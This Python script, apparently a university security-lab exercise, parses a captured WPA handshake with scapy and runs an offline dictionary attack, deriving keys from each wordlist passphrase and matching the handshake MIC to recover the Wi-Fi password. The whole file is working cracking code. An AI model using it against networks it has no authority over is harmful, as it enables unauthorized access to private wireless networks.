#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA) pour chaque passphrase. On va alors 
comparer avec le mic pour trouver la passphrase du dico. 
"""

__author__    = "Dylan Canton & Christian Zaccaria"
__copyright__ = "Copyright 2022, HEIG-VD"
__license__   = "GPL"
__version__   = "1.0"
__email__     = "dylan.canton@heig-vd.ch, christian.zaccaria@heig-vd.ch"
__status__    = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.pcap") 
passphrase_file = "passPhrases.txt"
passphrase_status = "Not found"

# on prend les frames nécessaires : le beacon frame, ainsi que les handshake 1,2 et 4
beacon = wpa[0]
handshake_f1 = wpa[5]
handshake_f2 = wpa[6]
handshake_f4 = wpa[8]

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = beacon.info.decode("utf-8")

# Replacement des ":" par "" dans les MAC, ceci pour les transformer en bytes
APmac       = a2b_hex(str.replace(handshake_f1.addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(handshake_f1.addr1, ":", ""))

# Authenticator and Supplicant Nonces
# Depuis le key descriptor type, on prend ANonce, respectivement SNonce (avec RAW)
ANonce      = handshake_f1.load[13:45]
SNonce      = raw(handshake_f2)[65:-72]  

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = raw(handshake_f4)[-18:-2]

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# Récupération de la dernière trame du handshake + remplacement des valeurs de la MIC key avec des zéro
data = raw(handshake_f4)[48:-18] + 18 * b"\x00"  # cf "Quelques détails importants" dans la donnée

print ("\n\nValues used to derivate keys")
print ("============================")
print ("Passphrase: ",passPhrase,"\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")

ssid = str.encode(ssid)

# On va parcourir le fichier txt afin de checker toutes les passphrases présentes
with open(passphrase_file) as file:
    for passphrase in file:

        # Besoin d'enlever le caractère "\n" sinon les passphrases seront comparé avec ce caractères et ne seront jamais correctes
        if passphrase[-1:] == "\n":
            passphrase = passphrase[:-1]
        
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passphrase)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK / Besoin de check le type de hash qui doit être utilisé
        mic = hmac.new(ptk[0:16],data,hashlib.md5) if int.from_bytes(handshake_f1.load[0:1], byteorder='big') != 2 else hmac.new(ptk[0:16],data,hashlib.sha1)

        #On check le mic trouvé avec celui de la passphrase = si c'est le même c'est qu'il est trouvé.
        if mic.hexdigest()[:-8] == b2a_hex(mic_to_test).decode():

            #Print d'information
            print ("\nResults of the key expansion")
            print ("=============================")
            print ("PMK:\t\t",pmk.hex(),"\n")
            print ("PTK:\t\t",ptk.hex(),"\n")
            print ("KCK:\t\t",ptk[0:16].hex(),"\n")
            print ("KEK:\t\t",ptk[16:32].hex(),"\n")
            print ("TK:\t\t",ptk[32:48].hex(),"\n")
            print ("MICK:\t\t",ptk[48:64].hex(),"\n")
            print ("MIC:\t\t",mic.hexdigest(),"\n")
            #On ajoute la passphrase à la variable d'état
            passphrase_status = passPhrase.decode()
            break

    # Affichage du résultat (Si not found = aucune passphrase du fichier correspond)
    print("Result of process ")
    print("==================")
    print("Passphrase is : ", passphrase_status, "\n")